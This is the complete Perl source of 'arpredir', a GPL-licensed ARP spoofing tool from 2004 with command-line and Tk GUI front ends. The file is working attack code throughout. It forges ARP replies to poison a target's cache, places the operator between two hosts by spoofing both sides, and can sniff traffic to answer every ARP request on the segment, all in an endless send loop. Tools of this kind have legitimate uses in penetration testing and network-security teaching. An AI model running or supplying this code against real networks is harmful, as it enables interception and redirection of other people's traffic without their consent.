#!/usr/bin/perl
# 
# ARP spoofing tool
# Version 0.5
#
# Programmed by Bastian Ballmann
# Last Update: 24.07.2004
# 
# This program is free software; you can redistribute 
# it and/or modify it under the terms of the 
# GNU General Public License version 2 as published 
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will 
# be useful, but WITHOUT ANY WARRANTY; without even 
# the implied warranty of MERCHANTABILITY or FITNESS 
# FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details. 

###[ Loading modules ]###

use path::config;                   # P.A.T.H. configuration
use Net::ARP;                       # ARP stuff
use Getopt::Std;                    # Parsing parameter
use Net::Pcap;                      # Sniffin around
use Net::RawIP;                     # Creating packets
use NetPacket::Ethernet qw(:strip); # Decoding Ethernet frames
use NetPacket::ARP;                 # Decoding ARP frames
use IO::Select;                     # Watching pipes
use strict;                         # Be strict!

# Do you have X and Tk?
BEGIN
{
    eval{ require Tk; };              
    import Tk unless $@;
}


###[ Signal handlers ]###

# Kill child process on INT or KILL signal
$SIG{INT} = \&exit_prog;
$SIG{KILL} = \&exit_prog;


###[ Global variables ]###

# Parameter hash
my %args;

# Config object
my $cfg = path::config->new();

# Pipes and pid of the child process
my ($read,$write,$pid);

# Flag to remember unreachable hosts
my $flag = 0;

# Tk objects
my ($top, $submit,$output);

# Pipe watcher
my $watcher = new IO::Select;

# Connection
my ($host1, $host2);
my $mac1 = "unknown";
my $mac2 = "unknown";

###[ MAIN PART ]###

# Need help?
usage() if( ($ARGV[0] eq "--help") || (scalar(@ARGV) == 0) );

# Start GUI version?
if($ARGV[0] eq "--gui")
{
    draw_gui();
}

# Terminal version
else
{
    # Parsing parameter
    getopts("ac:i:s:h:d:m:w:n",\%args);
    # Print about message
    about() unless defined $top;

    # Check the config and start the process
    check_cfg();
}


###[ Subroutines ]###

# Create and send an ARP packet
sub start
{
    # Check config
    usage() if $cfg->check(%args) == 1;
    usage() if( ($args{'s'} eq "") && ($args{'c'} eq "") && ($args{'a'} eq "") );

    # Set default values
    my $errbuf;
    msg("\n--> Collecting information\n");

    $args{'i'} = Net::Pcap::lookupdev(\$errbuf) unless defined $args{'i'};
    Net::ARP::get_mac($args{'i'},$args{'m'}) unless defined $args{'m'};
    $args{'w'} = 4 unless defined $args{'w'};
    msg("Device is $args{'i'}\n");
    msg("Source MAC is $args{'m'}\n");

    # Spoof one way
    if($args{'c'} eq "")
    {
	$args{'h'} = 0 unless defined $args{'h'};
	if( ($args{'d'} eq "") && ($args{'h'} != 0) )
	{
	    $args{'d'} = "unknown";
	    my $count = 0;
	    
	    while($args{'d'} eq "unknown")
	    {
		Net::ARP::arp_lookup($args{'i'}, $args{'h'}, $args{'d'});		  
		msg("MAC of $args{'h'} is $args{'d'}\n");
		  
		if($args{'d'} eq "unknown")
		{
		    if($count > 3)
		    {
			die("Cant find MAC address of IP $args{'h'}!\n");
		    }
		    else
		    {
			$count++;
			ping($args{'h'});
			sleep(1);
		    }
		}
	      }
	}
	elsif($args{'h'} == 0)
	{
	    $args{'d'} = 'ff:ff:ff:ff:ff:ff';
	}
    }

    # Spoof a connection
    else
    {
	my $count = 0;

	while($mac1 eq "unknown")
	{
	    Net::ARP::arp_lookup($args{'i'}, $host1, $mac1);
	    msg("MAC of $host1 is $mac1\n");

	    if($mac1 eq "unknown")
	    {
		if($count > 3)
		{
		    die("Cant find MAC address of IP $host1!\n");
		}
		else
		{
		    $count++;
		    ping($host1);
		    sleep(1);
		}
	    }
	}

	$count = 0;

	while($mac2 eq "unknown")
	{
	    Net::ARP::arp_lookup($args{'i'}, $host2, $mac2);
	    msg("MAC of $host2 is $mac2\n");

	    if($mac2 eq "unknown")
	    {
		if($count > 3)
		{
		    die("Cant find MAC address of IP $host2!\n");
		}
		else
		{
		    $count++;
		    ping($host2);
		    sleep(1);
		}
	    }
	}
    }

    msg("\n--> Start sending packets...\n");

    # Send only one ARP reply packet
    if($args{'n'})
    { 
	arp_spoof();
    } 

    # Create a child process to send the packets in loop-mode
    else 
    { 
	$submit->configure(state => 'disabled', text => 'Sending') if $submit; 

	# Create a child process
	($read,$write,$pid) = mkchild(); 

	# Add the read pipe to the watcher list
	$watcher->add($read);

	while(1)
	{
	    $top->update if defined $top;

	    # The child process has got something for us
	    if($watcher->can_read(1))
	    {
		my $msg = pipe_read($read);
		
		# Oh damn! There was an error!
		if($msg =~ /^\[err\]\s/)
		{
		    show_error($');
		    last;
		}
		
		# Hehe. The kid has caught a packet
		else
		{
		    my (@bytes, $srcip, $dstip);
		    my $arp = NetPacket::ARP->decode(eth_strip($msg));
		    
		    # Source and destination protocol address is hex
		    # Calculate the normal 4 byte style
		    my $tmp = hex($arp->{'spa'});
		    $bytes[0] = int $tmp/16777216;
		    my $rem = $tmp % 16777216;
		    $bytes[1] = int $rem/65536;
		    $rem = $rem % 65536;
		    $bytes[2] = int $rem/256;
		    $rem = $rem % 256;
		    $bytes[3] = $rem;
		    $args{'h'} = join '.', @bytes;
		    
		    $tmp = hex($arp->{'tpa'});
		    $bytes[0] = int $tmp/16777216;
		    $rem = $tmp % 16777216;
		    $bytes[1] = int $rem/65536;
		    $rem = $rem % 65536;
		    $bytes[2] = int $rem/256;
		    $rem = $rem % 256;
		    $bytes[3] = $rem;
		    $args{'s'} = join '.', @bytes;
		    
		    # Opcode ARP_REQUEST?
		    if($arp->{'opcode'} == 1)
		    {
			# Say here we are :)
			my @tmp = split(//,$arp->{'sha'});
			$args{'d'} = "$tmp[0]$tmp[1]:$tmp[2]$tmp[3]:$tmp[4]$tmp[5]:$tmp[6]$tmp[7]:$tmp[8]$tmp[9]:$tmp[10]$tmp[11]";
			arp_spoof();
		    }
		}
	    }
	}
    }
}


###[ Subroutines ]###

# Create and send ARP packet
sub arp_spoof
{
    # Spoof one way
    if($args{'c'} eq "")
    {
	msg("arp reply $args{'s'} is at $args{'m'}\n");
	
	Net::ARP::send_packet("$args{'i'}",  # Interface
			       "$args{'s'}",  # Source IP
			       "$args{'h'}",  # Destination IP
			       "$args{'m'}",  # Source MAC
			       "$args{'d'}",  # Destination MAC
			       'reply');      # ARP operation
    }

    # Spoof a connection
    else
    {
	msg("arp reply $host1 is at $args{'m'}\n");
	
	Net::ARP::send_packet("$args{'i'}",  # Interface
			       "$host1",      # Source IP
			       "$host2",      # Destination IP
			       "$args{'m'}",  # Source MAC
			       "$mac2",       # Destination MAC
			       'reply');      # ARP operation

	msg("arp reply $host2 is at $args{'m'}\n");
	
	Net::ARP::send_packet("$args{'i'}",  # Interface
			       "$host2",      # Source IP
			       "$host1",      # Destination IP
			       "$args{'m'}",  # Source MAC
			       "$mac1",       # Destination MAC
			       'reply');      # ARP operation
    }
}


# Send an ICMP echo request
sub ping
{
    msg("Sending icmp echo-request to $_[0]\n");
    my $packet = new Net::RawIP({icmp => {}});
    $packet->set({ 
	ip  => { protocol => 1,
		 tos      => 0,
		 daddr    => $_[0],
	     },
	icmp=> { type    => 8,
		 code    => 0
		 }
    });
    $packet->send();
}


# Print a message either on the GUI or 
# on STDOUT
sub msg
{
    if($top)
    {
	$output->insert('end',$_[0]);
	$output->see('end');
	$top->update();
    }
    else
    {
	print $_[0];
    }
}


# Create a child process
sub mkchild
{
    my $pid;

    # Create pipes
    pipe(my $father_read, my $father_write) or die $!;
    pipe(my $child_read, my $child_write) or die $!;

    # Fork child process
    $pid = fork();
    die "Cannot fork()!\n$!\n" unless defined $pid;

    # Father process
    if($pid != 0)
    {
	# Close unused pipes of the father process
	close($father_read); close($child_write);
	return($child_read,$father_write,$pid);
    }

    # Child process
    else
    {
	# Close unused pipes of the child process
	close($father_write); close($child_read);

	# Add the read pipe of the father to the watcher list
	$watcher->add($father_read);

	# Spoof all arp requests
	if($args{'a'})
	{
	    # Open network interface
	    my $errbuf;
	    my $pcap_dev = Net::Pcap::open_live($args{'i'}, 1024, 1, 1500, \$errbuf) or die "Error while opening device!\n$!\n";
		
	    if(defined $pcap_dev)
	    {
		# Compile and set the filter
		my ($net, $mask, $cfilter);
		my $filter = "arp";
		Net::Pcap::lookupnet($args{'i'}, \$net, \$mask, \$errbuf);
		Net::Pcap::compile($pcap_dev,\$cfilter,$filter,0,$mask);
		Net::Pcap::setfilter($pcap_dev,$cfilter);
		
		# Start sniffin
		while(1)
		{
		    if($watcher->can_read(0.1))
		    {
			my $msg = pipe_read($father_read);
			exit(0) if $msg eq "KILL";
		    }
		    
		    my %header;
		    my $packet = Net::Pcap::next($pcap_dev, \%header);
		    pipe_write($child_write,$packet);
		}
	    }
	}

	# Send spoofed arp replies frequently
	else
	{
	    while(1)
	    {
		if($watcher->can_read(1))
		{
		    my $msg = pipe_read($father_read);
		    exit(0) if $msg eq "KILL";
		}

		arp_spoof();
		sleep($args{'w'});
	    }
	}
    }
}


# Write data into a pipe
# Parameter: Pipe, Message
sub pipe_write
{
    my ($pipe,$msg) = @_;
    my $bytes = sprintf("0x%08x",length($msg));
    my $send = 0;
    while($send < length($msg)+10) { $send += syswrite($pipe,$bytes.$msg,length($msg)+10,$send); }
}


# Read data out of a pipe
# Parameter: Pipe
sub pipe_read
{
    my $pipe = shift;
    my ($bytes,$buffer,$msg);

    while(1)
    {
	sysread($pipe,$buffer,10);
	$bytes = hex($buffer) if $buffer ne "";
	last if $bytes > 0;
    }

    $buffer = 0;
    while($buffer < $bytes) { $buffer += sysread($pipe,$msg,$bytes-$buffer); }
    return $msg;
}


# Kill the child process and exit the program
sub exit_prog
{
    if(defined $pid)
    {
	pipe_write($write,"KILL");
	waitpid($pid,'-1');
    }

    exit(0);
}


# Usage
sub usage
{
    print "Usage: $0 -a -i <dev> -s <ip> -h <ip> -m <mac> -d <mac> -c <connection> -w <sec>\n\n";
    print "-a: Spoof all arp requests (optional)\n";
    print "-i <dev>: Network device to use (optional)\n";
    print "-s <ip>: Source IP to use\n";
    print "-h <ip>: Destination IP (optional)\n";
    print "-m <mac>: Source MAC (optional)\n";
    print "-d <mac>: Destination MAC (optional)\n";
    print "-c <connection> Spoof a connection (e.g. 192.168.1.1-192.168.1.2)\n";
    print "-w <sec>: Seconds to wait between ARP replys (optional)\n";
    print "-n: Don't loop. Send only one ARP reply (optional)\n";
    print "--gui to start the gui version\n\n";
    exit(0);
}


# About
sub about
{
    print "\narpredir -- An ARP spoofing tool\n";
    print "--------------------------------------\n";
    print "Version 0.5\n";
    print "Programmed by Bastian Ballmann [ Crazydj\@chaostal.de ]\n\n";
}


###[ The GUI code ]###

sub draw_gui
{
    # Main window
    $top = MainWindow->new(-background => 'black', 
			   -foreground => 'green', 
			   -borderwidth => 2);

    $top->title('ARPredir -- Just another ARP spoofing tool');
    $top->option(add => '*background', 'black');
    $top->option(add => '*foreground', 'green');

    # Frames
    my $content = $top->Frame->pack(-side => 'top', 
				    -pady => 10, 
				    -padx => 10);

    my $configure = $top->Frame->pack(-side => 'top', 
				      -pady => 5, 
				      -padx => 10);

    my $left = $configure->Frame->pack(-side => 'left', 
				       -padx => 10);

    my $right = $configure->Frame->pack(-side => 'right', 
					-padx => 10);

    my $spoof_frame = $top->Frame->pack(-side => 'top',
					-pady => 2,
					-padx => 15);

    my $lspoof = $spoof_frame->Frame->pack(-side => 'left', 
					   -padx => 15);

    my $rspoof = $spoof_frame->Frame->pack(-side => 'right', 
					   -padx => 15);    

    my $loop_frame = $top->Frame->pack(-side => 'top',
				       -pady => 2,
				       -padx => 15);
    
    my $lloop = $loop_frame->Frame->pack(-side => 'left', 
					 -padx => 15);

    my $rloop = $loop_frame->Frame->pack(-side => 'right', 
					 -padx => 15);    

    my $toolbar = $top->Frame->pack(-side => 'bottom', 
				    -pady => 5, 
				    -padx => 10);

    my $result_frame = $top->Frame->pack(-side => 'bottom', 
					 -padx => 10);


    # Labels
    $content->Label(-text => '[ ARPredir -- Just another ARP spoofing tool ]',
		    -border => 0)->pack(-pady => 5);

    $content->Label(-text => '[ Programmed by Bastian Ballmann ]',
		    -border => 0)->pack(-pady => 5);

    $content->Label(-text => '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-',
		    -border => 0)->pack(-pady => 5);


    # Configuration
    $left->Label(-text => 'Device:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    my $device = $right->Entry(-background => '#3C3C3C',
			       -textvariable => \$args{'i'})->pack(-pady => 6);
    my $errbuf;
    $device->insert(0,Net::Pcap::lookupdev(\$errbuf));
    
    $left->Label(-text => 'Source MAC:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    Net::ARP::get_mac($args{'i'},$args{'m'});

    $right->Entry(-background => '#3C3C3C',
		  -textvariable => \$args{'m'})->pack(-pady => 6);

    $left->Label(-text => 'Destination MAC:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $right->Entry(-background => '#3C3C3C',
		  -textvariable => \$args{'d'})->pack(-pady => 6);

    $left->Label(-text => 'Source IP:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $right->Entry(-background => '#3C3C3C',
		  -textvariable => \$args{'s'})->pack(-pady => 6);

    $left->Label(-text => 'Destination IP:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $right->Entry(-background => '#3C3C3C',
		  -textvariable => \$args{'h'})->pack(-pady => 6);

    $left->Label(-text => 'Connection:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $right->Entry(-background => '#3C3C3C',
		  -textvariable => \$args{'c'})->pack(-pady => 6);

    $left->Label(-text => 'Delay:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    my $delay = $right->Entry(-background => '#3C3C3C',
			      -textvariable => \$args{'w'})->pack(-pady => 6);
    $delay->insert('end',1);

    $lspoof->Label(-text => 'Spoof all: ',
		   -border => 0)->pack(-side => 'bottom', -pady => 10);

    $args{'a'} = 0;
    $rspoof->Radiobutton(-variable => \$args{'a'},
			 -text => 'Yes',
			 -value => 1)->pack(-side => 'left', -pady => 5, -padx => 8);

    $rspoof->Radiobutton(-variable => \$args{'a'},
			 -text => 'No',
			 -value => 0)->pack(-side => 'left', -pady => 5, -padx => 8);

    $lloop->Label(-text => 'Loop: ',
		  -border => 0)->pack(-side => 'bottom', -pady => 10);

    $args{'n'} = 0;
    $rloop->Radiobutton(-variable => \$args{'n'},
			-text => 'Yes',
			-value => 0)->pack(-side => 'left', -pady => 5, -padx => 8);

    $rloop->Radiobutton(-variable => \$args{'n'},
			-text => 'No',
			-value => 1)->pack(-side => 'left', -pady => 5, -padx => 8);


    # Toolbar
    $submit = $toolbar->Button(-text => 'Spoof it!',
			       -activebackground => 'black',
			       -activeforeground => 'red',
			       -borderwidth => 0,
			       -border => 0,
			       -command => \&check_cfg)->pack(-side => 'left', -padx => 10);

    $toolbar->Button(-text => 'Go away!',
		     -activebackground => 'black',
		     -activeforeground => 'red',
		     -borderwidth => 0,
		     -border => 0,
		     -command => \&exit_prog)->pack(-side => 'right', -padx => 10);

    # Output
    $result_frame->Label(-text => 'Output',
			 -border => 0)->pack(-side => 'top', -pady => 10);
    
    $output = $result_frame->Scrolled('Text',
				      -border => 2,
				      -width => 57,
				      -height => 10)->pack(-side => 'bottom', -pady => 5);

    $output->configure(-scrollbars => 'e');

    MainLoop();
}


# Check the config and start sending ARP packets
sub check_cfg
{
    if( ($args{'c'} eq "") && ($args{'a'} eq "") )
    {
	if( (length($args{'s'}) == 0) || (path::config::check_ip($args{'s'}) == 1) )
	{
	    show_error("Bad source IP address $args{'s'}\n"); return;
	}

	if( (length($args{'h'}) != 0) && (path::config::check_ip($args{'h'}) == 1) )
	{
	    show_error("Bad destination IP address $args{'h'}\n"); return;
	}
    }
    elsif($args{'a'} eq "")
    {
	($host1,$host2) = split(/\-/,$args{'c'});

	if(path::config::check_ip($host1) == 1)
	{
	    show_error("Bad connection IP address $host1\n"); return;
	}

	if(path::config::check_ip($host2) == 1)
	{
	    show_error("Bad connection IP address $host2\n"); return;
	}
    }

    if( (length($args{'m'}) > 0) && (path::config::check_mac($args{'m'}) == 1) )
    {
	show_error("Bad source MAC address $args{'m'}\n"); return;
    }

    if( (length($args{'d'}) > 0) && (path::config::check_mac($args{'d'}) == 1) )
    {
	show_error("Bad destination MAC address $args{'d'}\n"); return;
    }

    start(%args);
}


# Show Error Message
sub show_error
{
    if(defined $top)
    {
	my $error = $top->Toplevel;
	$error->title('Error');
	$error->option(add => '*background', 'black');
	$error->option(add => '*foreground', 'green');
    
	$error->Label(-text => $_[0],
		      -border => '0')->pack(-padx => 10, -pady => 10, -side => 'top');
    
	$error->Button(-text => 'OK',
		       -activebackground => 'black',
		       -activeforeground => 'red',
		       -border => 0,
		       -command => sub { $error->destroy })->pack(-pady => 5, -side => 'bottom');
    }
    else
    {
	die "$_[0]\n";
    }
}
